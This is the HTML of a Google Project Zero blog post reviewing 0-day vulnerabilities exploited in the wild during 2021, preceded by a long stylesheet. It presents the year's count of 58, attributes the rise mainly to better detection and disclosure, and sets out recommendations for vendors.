"}.lst-kix_bfmkl5o48mun-1>li:before{content:"\0025cb  "}.lst-kix_czzguda5pqu4-2>li{counter-increment:lst-ctn-kix_czzguda5pqu4-2}ol.lst-kix_qhs0t3wlsx02-6.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-6 0}.lst-kix_grz5i5wr9ig-8>li:before{content:"\0025a0  "}ol.lst-kix_jdourvkzhmg1-1{list-style-type:none}ol.lst-kix_jdourvkzhmg1-2{list-style-type:none}ol.lst-kix_jdourvkzhmg1-3{list-style-type:none}ol.lst-kix_jdourvkzhmg1-4{list-style-type:none}.lst-kix_grz5i5wr9ig-3>li:before{content:"\0025cf  "}.lst-kix_grz5i5wr9ig-5>li:before{content:"\0025a0  "}.lst-kix_bfmkl5o48mun-2>li:before{content:"\0025a0  "}ol.lst-kix_jdourvkzhmg1-0{list-style-type:none}.lst-kix_grz5i5wr9ig-2>li:before{content:"\0025a0  "}.lst-kix_grz5i5wr9ig-6>li:before{content:"\0025cf  "}ol.lst-kix_h2vtkcla8l9d-0{list-style-type:none}ol.lst-kix_h2vtkcla8l9d-5.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-5 0}.lst-kix_bfmkl5o48mun-3>li:before{content:"\0025cf  "}.lst-kix_bfmkl5o48mun-4>li:before{content:"\0025cb  "}ol.lst-kix_h2vtkcla8l9d-1{list-style-type:none}ol.lst-kix_h2vtkcla8l9d-2{list-style-type:none}.lst-kix_bfmkl5o48mun-5>li:before{content:"\0025a0  "}.lst-kix_grz5i5wr9ig-4>li:before{content:"\0025cb  "}.lst-kix_givsp5ka59r-2>li:before{content:"\0025a0  "}ol.lst-kix_h2vtkcla8l9d-0.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-0 0}.lst-kix_givsp5ka59r-1>li:before{content:"\0025cb  "}.lst-kix_givsp5ka59r-0>li:before{content:"\0025cf  "}ul.lst-kix_g56cmc7ljnve-8{list-style-type:none}ol.lst-kix_jdourvkzhmg1-2.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-2 0}.lst-kix_bqyk3pvm93qj-7>li:before{content:"\0025cb  "}.lst-kix_h2vtkcla8l9d-6>li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-6}.lst-kix_jdourvkzhmg1-8>li{counter-increment:lst-ctn-kix_jdourvkzhmg1-8}.lst-kix_qhs0t3wlsx02-5>li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-5}.lst-kix_bqyk3pvm93qj-6>li:before{content:"\0025cf  "}.lst-kix_bqyk3pvm93qj-4>li:before{content:"\0025cb  "}.lst-kix_h2vtkcla8l9d-0>li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-0}ol.lst-kix_jdourvkzhmg1-8.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-8 0}.lst-kix_bqyk3pvm93qj-5>li:before{content:"\0025a0  "}ol.lst-kix_qhs0t3wlsx02-7.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-7 0}.lst-kix_bqyk3pvm93qj-2>li:before{content:"\0025a0  "}.lst-kix_bqyk3pvm93qj-3>li:before{content:"\0025cf  "}.lst-kix_718o7hzyu4f-5>li:before{content:"\0025a0  "}ol.lst-kix_h2vtkcla8l9d-6.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-6 0}.lst-kix_718o7hzyu4f-4>li:before{content:"\0025cb  "}.lst-kix_718o7hzyu4f-8>li:before{content:"\0025a0  "}ul.lst-kix_rwsfzn4jdl6v-1{list-style-type:none}ol.lst-kix_qhs0t3wlsx02-2.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-2 0}ul.lst-kix_rwsfzn4jdl6v-2{list-style-type:none}ul.lst-kix_rwsfzn4jdl6v-0{list-style-type:none}.lst-kix_718o7hzyu4f-7>li:before{content:"\0025cb  "}ul.lst-kix_rwsfzn4jdl6v-5{list-style-type:none}ul.lst-kix_rwsfzn4jdl6v-6{list-style-type:none}.lst-kix_718o7hzyu4f-6>li:before{content:"\0025cf  "}ul.lst-kix_rwsfzn4jdl6v-3{list-style-type:none}ul.lst-kix_rwsfzn4jdl6v-4{list-style-type:none}ul.lst-kix_g56cmc7ljnve-3{list-style-type:none}ol.lst-kix_czzguda5pqu4-6{list-style-type:none}ul.lst-kix_g56cmc7ljnve-2{list-style-type:none}ol.lst-kix_czzguda5pqu4-7{list-style-type:none}ul.lst-kix_g56cmc7ljnve-1{list-style-type:none}ol.lst-kix_czzguda5pqu4-4{list-style-type:none}ul.lst-kix_rwsfzn4jdl6v-7{list-style-type:none}ul.lst-kix_g56cmc7ljnve-0{list-style-type:none}ol.lst-kix_czzguda5pqu4-5{list-style-type:none}ul.lst-kix_rwsfzn4jdl6v-8{list-style-type:none}ul.lst-kix_g56cmc7ljnve-7{list-style-type:none}.lst-kix_bqyk3pvm93qj-8>li:before{content:"\0025a0  "}ol.lst-kix_czzguda5pqu4-2{list-style-type:none}ul.lst-kix_g56cmc7ljnve-6{list-style-type:none}ol.lst-kix_czzguda5pqu4-3{list-style-type:none}.lst-kix_jdourvkzhmg1-2>li{counter-increment:lst-ctn-kix_jdourvkzhmg1-2}ul.lst-kix_g56cmc7ljnve-5{list-style-type:none}ol.lst-kix_czzguda5pqu4-0{list-style-type:none}.lst-kix_718o7hzyu4f-0>li:before{content:"\0025cf  "}ul.lst-kix_g56cmc7ljnve-4{list-style-type:none}ol.lst-kix_czzguda5pqu4-1{list-style-type:none}.lst-kix_718o7hzyu4f-1>li:before{content:"\0025cb  "}ol.lst-kix_czzguda5pqu4-6.start{counter-reset:lst-ctn-kix_czzguda5pqu4-6 0}.lst-kix_718o7hzyu4f-3>li:before{content:"\0025cf  "}ol.lst-kix_czzguda5pqu4-8{list-style-type:none}.lst-kix_718o7hzyu4f-2>li:before{content:"\0025a0  "}ol.lst-kix_jdourvkzhmg1-0.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-0 0}ol.lst-kix_czzguda5pqu4-4.start{counter-reset:lst-ctn-kix_czzguda5pqu4-4 0}.lst-kix_h2vtkcla8l9d-0>li:before{content:"" counter(lst-ctn-kix_h2vtkcla8l9d-0,decimal) ". "}.lst-kix_jdourvkzhmg1-7>li:before{content:"" counter(lst-ctn-kix_jdourvkzhmg1-7,lower-latin) ". "}ol.lst-kix_qhs0t3wlsx02-5.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-5 0}.lst-kix_jdourvkzhmg1-0>li{counter-increment:lst-ctn-kix_jdourvkzhmg1-0}.lst-kix_h2vtkcla8l9d-4>li:before{content:"" counter(lst-ctn-kix_h2vtkcla8l9d-4,lower-latin) ". "}.lst-kix_jdourvkzhmg1-3>li:before{content:"" counter(lst-ctn-kix_jdourvkzhmg1-3,decimal) ". "}.lst-kix_rvy0q9fw47sg-3>li:before{content:"\0025cf  "}.lst-kix_h2vtkcla8l9d-2>li:before{content:"" counter(lst-ctn-kix_h2vtkcla8l9d-2,lower-roman) ". "}.lst-kix_h2vtkcla8l9d-6>li:before{content:"" counter(lst-ctn-kix_h2vtkcla8l9d-6,decimal) ". "}.lst-kix_rvy0q9fw47sg-1>li:before{content:"\0025cb  "}.lst-kix_jdourvkzhmg1-1>li{counter-increment:lst-ctn-kix_jdourvkzhmg1-1}.lst-kix_3zaknyhdqv25-8>li:before{content:"\0025a0  "}.lst-kix_jdourvkzhmg1-5>li:before{content:"" counter(lst-ctn-kix_jdourvkzhmg1-5,lower-roman) ". "}.lst-kix_qhs0t3wlsx02-1>li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-1}.lst-kix_3zaknyhdqv25-2>li:before{content:"\0025a0  "}.lst-kix_3zaknyhdqv25-4>li:before{content:"\0025cb  "}.lst-kix_bqyk3pvm93qj-1>li:before{content:"\0025cb  "}.lst-kix_h2vtkcla8l9d-8>li:before{content:"" counter(lst-ctn-kix_h2vtkcla8l9d-8,lower-roman) ". "}.lst-kix_czzguda5pqu4-4>li{counter-increment:lst-ctn-kix_czzguda5pqu4-4}.lst-kix_3zaknyhdqv25-6>li:before{content:"\0025cf  "}.lst-kix_jdourvkzhmg1-1>li:before{content:"" counter(lst-ctn-kix_jdourvkzhmg1-1,lower-latin) ". "}.lst-kix_rwsfzn4jdl6v-6>li:before{content:"\0025cf  "}ol.lst-kix_czzguda5pqu4-1.start{counter-reset:lst-ctn-kix_czzguda5pqu4-1 0}.lst-kix_rvy0q9fw47sg-5>li:before{content:"\0025a0  "}.lst-kix_9i24fh2252ug-4>li:before{content:"\0025cb  "}.lst-kix_9i24fh2252ug-8>li:before{content:"\0025a0  "}.lst-kix_rwsfzn4jdl6v-8>li:before{content:"\0025a0  "}.lst-kix_rvy0q9fw47sg-7>li:before{content:"\0025cb  "}.lst-kix_1mxsacho6zj1-3>li:before{content:"\0025cf  "}.lst-kix_3zaknyhdqv25-0>li:before{content:"\0025cf  "}.lst-kix_9i24fh2252ug-6>li:before{content:"\0025cf  "}.lst-kix_givsp5ka59r-3>li:before{content:"\0025cf  "}ol.lst-kix_qhs0t3wlsx02-8{list-style-type:none}.lst-kix_1mxsacho6zj1-5>li:before{content:"\0025a0  "}.lst-kix_givsp5ka59r-5>li:before{content:"\0025a0  "}.lst-kix_givsp5ka59r-7>li:before{content:"\0025cb  "}.lst-kix_grz5i5wr9ig-0>li:before{content:"\0025cf  "}.lst-kix_1mxsacho6zj1-7>li:before{content:"\0025cb  "}.lst-kix_rwsfzn4jdl6v-4>li:before{content:"\0025cb  "}ol.lst-kix_qhs0t3wlsx02-3{list-style-type:none}ol.lst-kix_qhs0t3wlsx02-2{list-style-type:none}ol.lst-kix_qhs0t3wlsx02-1{list-style-type:none}ol.lst-kix_czzguda5pqu4-2.start{counter-reset:lst-ctn-kix_czzguda5pqu4-2 0}ol.lst-kix_qhs0t3wlsx02-0{list-style-type:none}ol.lst-kix_qhs0t3wlsx02-7{list-style-type:none}ol.lst-kix_qhs0t3wlsx02-6{list-style-type:none}.lst-kix_rwsfzn4jdl6v-2>li:before{content:"\0025a0  "}ol.lst-kix_qhs0t3wlsx02-5{list-style-type:none}ol.lst-kix_qhs0t3wlsx02-4{list-style-type:none}ol.lst-kix_qhs0t3wlsx02-4.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-4 0}ol.lst-kix_czzguda5pqu4-3.start{counter-reset:lst-ctn-kix_czzguda5pqu4-3 0}.lst-kix_rwsfzn4jdl6v-0>li:before{content:"\0025cf  "}.lst-kix_czzguda5pqu4-8>li:before{content:"" counter(lst-ctn-kix_czzguda5pqu4-8,lower-roman) ". "}.lst-kix_qhs0t3wlsx02-0>li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-0}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_czzguda5pqu4-6>li:before{content:"" counter(lst-ctn-kix_czzguda5pqu4-6,decimal) ". "}.lst-kix_knibgsincpme-0>li:before{content:"\0025cf  "}.lst-kix_czzguda5pqu4-0>li:before{content:"" counter(lst-ctn-kix_czzguda5pqu4-0,decimal) ". "}.lst-kix_czzguda5pqu4-4>li:before{content:"" counter(lst-ctn-kix_czzguda5pqu4-4,lower-latin) ". "}.lst-kix_knibgsincpme-2>li:before{content:"\0025a0  "}.lst-kix_h2vtkcla8l9d-5>li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-5}.lst-kix_qhs0t3wlsx02-6>li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-6}.lst-kix_czzguda5pqu4-3>li{counter-increment:lst-ctn-kix_czzguda5pqu4-3}.lst-kix_czzguda5pqu4-2>li:before{content:"" counter(lst-ctn-kix_czzguda5pqu4-2,lower-roman) ". "}ol{margin:0;padding:0}table td,table th{padding:0}.HNYIspzEBn-c4{margin-left:36pt;padding-top:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.HNYIspzEBn-c11{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.HNYIspzEBn-c13{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:20pt;font-family:"Arial";font-style:normal}.HNYIspzEBn-c16{color:#666666;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:15pt;font-family:"Arial";font-style:normal}.HNYIspzEBn-c8{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:italic}.HNYIspzEBn-c7{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.HNYIspzEBn-c2{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.HNYIspzEBn-c12{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:"Arial";font-style:normal}.HNYIspzEBn-c0{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.HNYIspzEBn-c18{padding-top:0pt;padding-bottom:16pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.HNYIspzEBn-c5{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.HNYIspzEBn-c1{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.HNYIspzEBn-c10{font-family:Consolas,"Courier New";color:#0d904f;font-weight:400}.HNYIspzEBn-c19{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.HNYIspzEBn-c3{color:inherit;text-decoration:inherit}.HNYIspzEBn-c6{padding:0;margin:0}.HNYIspzEBn-c9{font-weight:700;font-style:italic}.HNYIspzEBn-c17{font-weight:700}.HNYIspzEBn-c14{font-style:italic}.HNYIspzEBn-c15{margin-left:36pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="HNYIspzEBn-c19">
 <p class="c18 subtitle" id="h.bcdrmuya7iqp"><span class="HNYIspzEBn-c16">A Year in Review of 0-days Used In-the-Wild in 2021</span></p>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">Posted by Maddie Stone, Google Project Zero</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>This is our third annual year in review of 0-days exploited in-the-wild [</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2021/02/deja-vu-lnerability.html">2020</a></span><span>, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2020/07/detection-deficit-year-in-review-of-0.html">2019</a></span><span>]. Each year we&rsquo;ve looked back at all of the detected and disclosed in-the-wild 0-days as a group and synthesized what we think the trends and takeaways are. The goal of this report is not to detail each individual exploit, but instead to analyze the exploits from the year as a group, looking for trends, gaps, lessons learned, successes, etc. If you&rsquo;re interested in the analysis of individual exploits, please check out our </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/p/rca.html">root cause analysis repository</a></span><span class="HNYIspzEBn-c0">.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>We perform and share this analysis in order to </span><span class="HNYIspzEBn-c17">make 0-day hard</span><span>. We want it to be more costly, more resource intensive, and overall more difficult for attackers to use 0-day capabilities. 2021 highlighted just how important it is to stay relentless in our pursuit to make it harder for attackers to exploit users with 0-days. We heard </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://forbiddenstories.org/about-the-pegasus-project/">over</a></span><span>&nbsp;and </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/">over</a></span><span>&nbsp;and </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://www.amnesty.org/en/latest/research/2021/11/devices-of-palestinian-human-rights-defenders-hacked-with-nso-groups-pegasus-spyware-2/">over</a></span><span class="HNYIspzEBn-c0">&nbsp;about how governments were targeting journalists, minoritized populations, politicians, human rights defenders, and even security researchers around the world. The decisions we make in the security and tech communities can have real impacts on society and our fellow humans&rsquo; lives.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>We&rsquo;ll provide our evidence and process for our conclusions in the body of this post, and then wrap it all up with our thoughts on next steps and hopes for 2022 in the conclusion. If digging into the bits and bytes is not your thing, then feel free to just check-out the Executive Summary and Conclusion.</span></p><h1 class="HNYIspzEBn-c11" id="h.tf3r1j8la9a4"><span class="HNYIspzEBn-c13">Executive Summary</span></h1>
 <p class="HNYIspzEBn-c5"><span>2021 included the detection and disclosure of </span><span>58</span><span>&nbsp;in-the-wild 0-days, the most ever recorded since Project Zero began tracking in mid-2014. That&rsquo;s more than double the previous maximum of 28 detected in 2015 and especially stark when you consider that there were only 25 detected in 2020. We&rsquo;ve tracked publicly known in-the-wild 0-day exploits in </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=0">this spreadsheet</a></span><span class="HNYIspzEBn-c0">&nbsp;since mid-2014.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>While we often talk about the number of 0-day exploits </span><span class="HNYIspzEBn-c9">used</span><span>&nbsp;in-the-wild, what we&rsquo;re actually discussing is the number of 0-day exploits </span><span class="HNYIspzEBn-c9">detected and disclosed</span><span class="HNYIspzEBn-c14">&nbsp;</span><span class="HNYIspzEBn-c0">as in-the-wild. And that leads into our first conclusion: we believe the large uptick in in-the-wild 0-days in 2021 is due to increased detection and disclosure of these 0-days, rather than simply increased usage of 0-day exploits.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>With this record number of in-the-wild 0-days to analyze we saw that attacker methodology hasn&rsquo;t actually had to change much from previous years</span><span>. Attackers are having success using the same bug patterns and exploitation techniques and going after the same attack surfaces. Project Zero&rsquo;s mission is &ldquo;make 0day hard&rdquo;.</span><span>&nbsp;</span><span class="HNYIspzEBn-c0">0-day will be harder when, overall, attackers are not able to use public methods and techniques for developing their 0-day exploits. When we look over these 58 0-days used in 2021, what we see instead are 0-days that are similar to previous &amp; publicly known vulnerabilities. Only two 0-days stood out as novel: one for the technical sophistication of its exploit and the other for its use of logic bugs to escape the sandbox.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>So while we recognize the industry&rsquo;s improvement in the detection and disclosure of in-the-wild 0-days, we also acknowledge that there&rsquo;s a lot more improving to be done.</span><span class="HNYIspzEBn-c0">&nbsp;Having access to more &ldquo;ground truth&rdquo; of how attackers are actually using 0-days shows us that they are able to have success by using previously known techniques and methods rather than having to invest in developing novel techniques. This is a clear area of opportunity for the tech industry.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>We had so many more data points in 2021 to learn about attacker behavior than we&rsquo;ve had in the past. Having all this data, though, has left us with even more questions than we had before. </span><span>Unfortunately, attackers who actively use 0-day exploits do not share the 0-days they&rsquo;re using or what percentage of 0-days we&rsquo;re missing in our tracking, so we&rsquo;ll never know exactly what proportion of 0-days are currently being found and disclosed publi</span><span class="HNYIspzEBn-c0">cly. </span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">Based on our analysis of the 2021 0-days we hope to see the following progress in 2022 in order to continue taking steps towards making 0-day hard:</span></p><ol class="c6 lst-kix_jdourvkzhmg1-0 start" start="1"><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span class="HNYIspzEBn-c0">All vendors agree to disclose the in-the-wild exploitation status of vulnerabilities in their security bulletins.</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span class="HNYIspzEBn-c0">Exploit samples or detailed technical descriptions of the exploits are shared more widely.</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span class="HNYIspzEBn-c0">Continued concerted efforts on reducing memory corruption vulnerabilities or rendering them unexploitable.Launch mitigations that will significantly impact the exploitability of memory corruption vulnerabilities.</span></li></ol><h1 class="HNYIspzEBn-c11" id="h.ka5ptbumk5o1"><span class="HNYIspzEBn-c13">A Record Year for In-the-Wild 0-days</span></h1>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">2021 was a record year for in-the-wild 0-days. So what happened?</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"></p>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">

   
   <a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjC72HVhQEdwHNIzMiyb18bUFr6hPCWJiKL2Mm43-tW11qc0ucOPI8A9oChEXQe0-QNOBF83SIcfyjcyvPveuWvgipbiBzHWqZTx2-LilJFYIbx6uQeno9f481HJQ0CgylQkh8Ks7AbGC6tjhYDNBcI7jh6ihhzJATA0r_P4bQUBm-1lmHp2DPvWM6I/s1200/image1%287%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjC72HVhQEdwHNIzMiyb18bUFr6hPCWJiKL2Mm43-tW11qc0ucOPI8A9oChEXQe0-QNOBF83SIcfyjcyvPveuWvgipbiBzHWqZTx2-LilJFYIbx6uQeno9f481HJQ0CgylQkh8Ks7AbGC6tjhYDNBcI7jh6ihhzJATA0r_P4bQUBm-1lmHp2DPvWM6I/s1200/image1%287%29.png" border="0" alt="bar graph showing the number of in-the-wild 0-day detected per year from 2015-2021. The totals are taken from this tracking spreadsheet: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" style="max-height: 750; max-width: 600px;"title="bar graph showing the number of in-the-wild 0-day detected per year from 2015-2021. The totals are taken from this tracking spreadsheet: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" /></a></span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">Is it that software security is getting worse? Or is it that attackers are using 0-day exploits more? Or has our ability to detect and disclose 0-days increased? When looking at the significant uptick from 2020 to 2021, we think it&#39;s mostly explained by the latter. While we believe there has been a steady growth in interest and investment in 0-day exploits by attackers in the past several years, and that security still needs to urgently improve, it appears that the security industry&#39;s ability to detect and disclose in-the-wild 0-day exploits is the primary explanation for the increase in observed 0-day exploits in 2021.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>While we often talk about &ldquo;0-day exploits </span><span class="HNYIspzEBn-c9">used </span><span>in-the-wild&rdquo;, what we&rsquo;re actually tracking are &ldquo;0-day exploits </span><span class="HNYIspzEBn-c9">detected and disclosed</span><span>&nbsp;as used in-the-wild&rdquo;.</span><span>&nbsp;There are more factors than just the </span><span class="HNYIspzEBn-c9">use</span><span class="HNYIspzEBn-c14">&nbsp;</span><span class="HNYIspzEBn-c0">that contribute to an increase in that number, most notably: detection and disclosure. Better detection of 0-day exploits and more transparently disclosed exploited 0-day vulnerabilities is a positive indicator for security and progress in the industry. </span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">Overall, we can break down the uptick in the number of in-the-wild 0-days into:</span></p><ul style="padding: 0;" class="c6 lst-kix_rwsfzn4jdl6v-0 start"><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span class="HNYIspzEBn-c0">More detection of in-the-wild 0-day exploits</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span class="HNYIspzEBn-c0">More public disclosure of in-the-wild 0-day exploitation</span></li></ul><h2 class="HNYIspzEBn-c7" id="h.irhic7h0695k"><span class="HNYIspzEBn-c12">More detection</span></h2>
 <p class="HNYIspzEBn-c5"><span>In the </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2020/07/detection-deficit-year-in-review-of-0.html">2019 Year in Review</a></span><span>, we wrote about the &ldquo;Detection Deficit&rdquo;. We stated &ldquo;</span><span class="HNYIspzEBn-c17">As a community, our ability to detect 0-days being used in the wild is severely lacking to the point that we can&rsquo;t draw significant conclusions due to the lack of (and biases in) the data we have collected</span><span class="HNYIspzEBn-c0">.&rdquo; In the last two years, we believe that there&rsquo;s been progress on this gap. </span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>Anecdotally, we hear from more people that they&rsquo;ve begun working more on detection of 0-day exploits. Quantitatively, while a </span><span class="HNYIspzEBn-c14">very</span><span>&nbsp;rough measure, we&rsquo;re also seeing the number of entities credited with reporting in-the-wild 0-days increasing. I</span><span>t stands to reason that if the number of people working on trying to find 0-day exploits increases, then the number of in-the-wild 0-day exploits detected may increase.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"></p>

 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMbFpoEKSSn5AbAzsovaZ0yN6_OFXo9u4hpDCXJBpro8LRUWJlVQ9CSqtzT2V9ohrhOvP3_RnrYsOzFGPK0FZGJmW2713g2vVW82ReJVXpjAZc57BCxtHg8i-6AdR_ThDZB6UKvzAKekbmAkuUBliMyDyWSBW87z4ZZQJC3KX-_ptZIHveotLGoJ9I/s1200/image5%284%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMbFpoEKSSn5AbAzsovaZ0yN6_OFXo9u4hpDCXJBpro8LRUWJlVQ9CSqtzT2V9ohrhOvP3_RnrYsOzFGPK0FZGJmW2713g2vVW82ReJVXpjAZc57BCxtHg8i-6AdR_ThDZB6UKvzAKekbmAkuUBliMyDyWSBW87z4ZZQJC3KX-_ptZIHveotLGoJ9I/s1200/image5%284%29.png" border="0" alt="A bar graph showing the number of distinct reporters of 0-day in-the-wild vulnerabilities per year for 2019-2021. 2019: 9, 2020: 10, 2021: 20. The data is taken from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" style="max-height: 750; max-width: 600px;"title="A bar graph showing the number of distinct reporters of 0-day in-the-wild vulnerabilities per year for 2019-2021. 2019: 9, 2020: 10, 2021: 20. The data is taken from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" /></a></span></p>
 <p class="HNYIspzEBn-c5"></p>

